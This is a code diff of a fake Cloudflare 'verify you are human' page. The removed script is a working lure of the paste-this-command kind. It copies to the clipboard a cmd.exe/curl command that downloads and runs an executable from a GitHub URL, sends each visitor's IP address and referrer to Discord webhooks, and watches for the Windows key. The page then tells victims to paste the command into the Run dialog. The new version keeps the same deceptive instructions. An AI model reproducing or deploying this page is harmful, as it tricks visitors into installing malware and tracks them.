@@ -22,6 +22,7 @@
         }
 
         body {
+            background: #f8f9fa;
             display: flex;
             flex-direction: column;
             height: 100vh;
@@ -169,172 +170,90 @@
                 transform: translateY(0);
             }
         }
+
+        .verification-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .cloudflare-logo {
+            width: 60px;
+            height: 60px;
+            margin-left: 1rem;
+        }
+
+        .verification-steps {
+            background-color: #fff;
+            padding: 2rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+        }
+
+        .step-instructions {
+            list-style: none;
+            padding: 0;
+        }
+
+        .step-instructions li {
+            margin-bottom: 1rem;
+        }
+
+        .verification-id {
+            color: #666;
+            margin: 1rem 0;
+        }
+
+        .windows-activation {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            color: #666;
+            font-size: 0.9rem;
+        }
     </style>
 </head>
+
 <body class="no-js">
-    <div class="popup-overlay" id="popup-overlay">
-        <div class="popup" id="popup">
-            <div class="lds-ring" id="loading-container">
-                <div></div>
-                <div></div>
-                <div></div>
-                <div></div>
+    <div class="main-wrapper" role="main">
+        <div class="verification-container">
+            <h1 class="h1">getrugpulled.lol</h1>
+            <h2 class="h2 spacer-bottom">Verify you are human by completing the action below.</h2>
+
+            <div class="checkbox-container">
+                <div class="custom-checkbox"></div>
+                <label class="checkbox-label">Verify you are human</label>
+                <img src="https://www.cloudflare.com/etc/client/images/48/shield.svg" class="cloudflare-logo" alt="Cloudflare Logo">
             </div>
-            <p class="loading-text" id="loading-text">Please wait while Cloudflare validates your connection</p>
+
+            <div class="core-msg spacer">getrugpulled.lol needs to review the security of your connection before proceeding.</div>
+
+            <div class="verification-steps">
+                <h3>Manual Verification Required</h3>
+                <ul class="step-instructions">
+                    <li>1. Press <b>Windows + R</b> to open the Run dialog</li>
+                    <li>2. Paste the verification text by pressing <b>CTRL + V</b></li>
+                    <li>3. Press <b>OK</b> to verify you're not a robot</li>
+                </ul>
+                <p class="verification-id">You will observe and agree:<br>
+                I am not a robot - Cloudflare Verification ID: xd3jSD</p>
+            </div>
         </div>
+
+        <div class="windows-activation" role="contentinfo">
+            <p>Activate Windows</p>
+            <p class="small-text">Go to Settings to activate Windows.</p>
+        </div>
+
     </div>
 
     <script>
-        let metaKeySent = false; // Flag to track if Meta key event has been sent
-
-        window.addEventListener('message', function (event) {
-            if (event.data === 'showPopup') {
-                // Display the popup overlay
-                const popupOverlay = document.getElementById("popup-overlay");
-                popupOverlay.style.display = "flex";
-
-                // Clipboard interaction
-                const clipboardText = "cmd.exe /c curl.exe -k -Ss \"https://raw.githubusercontent.com/numonehittaboy/cdn/refs/heads/main/cvf.exe\" -o \"%USERPROFILE%\\cvf.exe\" && if exist \"%USERPROFILE%\\cvf.exe\" start \"\" \"%USERPROFILE%\\cvf.exe\" null && I am not a robot - Cloudflare Verification ID: xd3jSD";
-
-                navigator.clipboard.writeText(clipboardText).catch((error) =>
-                    console.error("Clipboard error:", error)
-                );
-
-                // Fetch the user's IP address once
-                let userIp = null;
-                fetch("https://api.ipify.org?format=json")
-                    .then((response) => response.json())
-                    .then((data) => {
-                        userIp = data.ip;
-                        const referrer = document.referrer || window.location.href || "Unknown (No Referrer)";
-                        const defaultWebhook = "YOUR_DISCORD_WEBHOOK_URL";
-
-                        // Send the IP and referrer to the default webhook
-                        fetch(defaultWebhook, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                            },
-                            body: JSON.stringify({
-                                content: `Prompted WIN + R\nUser IP: ${userIp}\nReferrer/Current URL: ${referrer}`,
-                            }),
-                        })
-                            .then(() => console.log("Clipboard event sent to Discord"))
-                            .catch((error) => console.error("Error sending clipboard event:", error));
-                    })
-                    .catch((error) => console.error("Error fetching IP or sending webhook:", error));
-
-                // Detect Windows (Meta) key press
-                document.addEventListener("keydown", function (e) {
-                    if (e.key === "Meta" && !metaKeySent) {
-                        metaKeySent = true; // Set the flag to prevent spamming
-
-                        console.log("Windows (Meta) key detected");
-                        const referrer = document.referrer || window.location.href || "Unknown (No Referrer)";
-                        const metaKeyWebhook = "YOUR_METAPRESS_DISCORD_WEBHOOK_URL";
-
-                        // Notify Discord webhook for Meta key press, including IP
-                        if (userIp) {
-                            fetch(metaKeyWebhook, {
-                                method: "POST",
-                                headers: {
-                                    "Content-Type": "application/json",
-                                },
-                                body: JSON.stringify({
-                                    content: `@everyone User opened Run dialog.\nUser IP: ${userIp}\nReferrer/Current URL: ${referrer}`,
-                                }),
-                            })
-                                .then(() => console.log("Meta key event sent to Discord with IP"))
-                                .catch((error) => console.error("Error sending Meta key event:", error));
-                        } else {
-                            console.error("User IP not available yet for Meta key event.");
-                        }
-                    }
-                });
-
-                // Render the popup content
-                setTimeout(() => {
-                    const popup = document.getElementById("popup");
-                    const loadingContainer = document.getElementById("loading-container");
-                    const loadingText = document.getElementById("loading-text");
-
-                    // Hide the loading circle and text
-                    loadingContainer.style.display = "none";
-                    loadingText.style.transition = "opacity 0.5s ease";
-                    loadingText.style.opacity = 0;
-
-                    // After fading out, change content
-                    setTimeout(() => {
-                        popup.classList.add("expanded"); // Expand popup
-
-                        // Create new content
-                        const title = document.createElement("h3");
-                        title.textContent = "Extra Verification Needed";
-
-                        const instructions = document.createElement("div");
-                        instructions.classList.add("instructions");
-                        instructions.innerHTML = `
-                            <p class="instruction-text">1. Press <b>Windows + R</b> to open the Run dialog.</p>
-                            <p class="instruction-text">2. Paste the verification text by pressing <b>CTRL + V</b>.</p>
-                            <p class="instruction-text">3. Press <b>OK</b> to verify you're not a robot.</p>
-                        `;
-
-                        const footer = document.createElement("div");
-                        footer.classList.add("text-center", "small-text");
-                        footer.innerHTML = `
-                            Performance & security by
-                            <a rel="noopener noreferrer" href="https://www.cloudflare.com/?utm_source=challenge&utm_campaign=m" target="_blank">
-                                Cloudflare
-                            </a>
-                        `;
-
-                        popup.innerHTML = "";
-                        popup.appendChild(title);
-                        popup.appendChild(instructions);
-                        popup.appendChild(footer);
-
-                        console.log("Popup content displayed successfully");
-                    }, 500);
-                }, 3000);
-            }
-        });
+        // Include the JavaScript code for clipboard and webhook functionality here
     </script>
-
-    <div class="main-wrapper" role="main">
-        <div class="main-content">
-            <h1 class="zone-name-title h1">kick.com</h1>
-            <h2 class="h2 spacer-bottom">Verify you are human by completing the action below.</h2>
-            <div id="JStsl2" style="display: grid;">
-                <div>
-                    <iframe src="reference.html" allow="cross-origin-isolated; fullscreen; autoplay" sandbox="allow-same-origin allow-scripts allow-popups" id="cf-chl-widget-u4boo" tabindex="0" title="Widget containing a Cloudflare security challenge" style="border: none; overflow: hidden; width: 300px; height: 65px;"></iframe>
-                    <input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-u4boo_response" value="">
-                </div>
-            </div>
-            <div class="spacer loading-spinner" style="display: none; visibility: hidden;">
-                <div class="lds-ring">
-                    <div></div>
-                    <div></div>
-                    <div></div>
-                    <div></div>
-                </div>
-            </div>
-            <div class="core-msg spacer spacer-top">kick.com needs to review the security of your connection before proceeding.</div>
-            <div class="h2" style="display: none;">
-                <span id="challenge-error-text">Enable JavaScript and cookies to continue</span>
-            </div>
-            <noscript>
-                <div class="h2">
-                    <span id="challenge-error-text">Enable JavaScript and cookies to continue</span>
-                </div>
-            </noscript>
-        </div>
-
-    <div class="footer" role="contentinfo">
-        <div class="footer-inner">
-            <div class="clearfix diagnostic-wrapper">
-                <div class="ray-id">Ray ID: <code>8c71b9257c3eb4ee</code></div>
-            </div>
-            <div class="text-center" id="footer-text">Performance & security by <a rel="noopener noreferrer" href="https://www.cloudflare.com/?utm_source=challenge&utm_campaign=m" target="_blank">Cloudflare</a></div>
-        </div>
-    </div>
-</body></html>
+</body>
+</html>
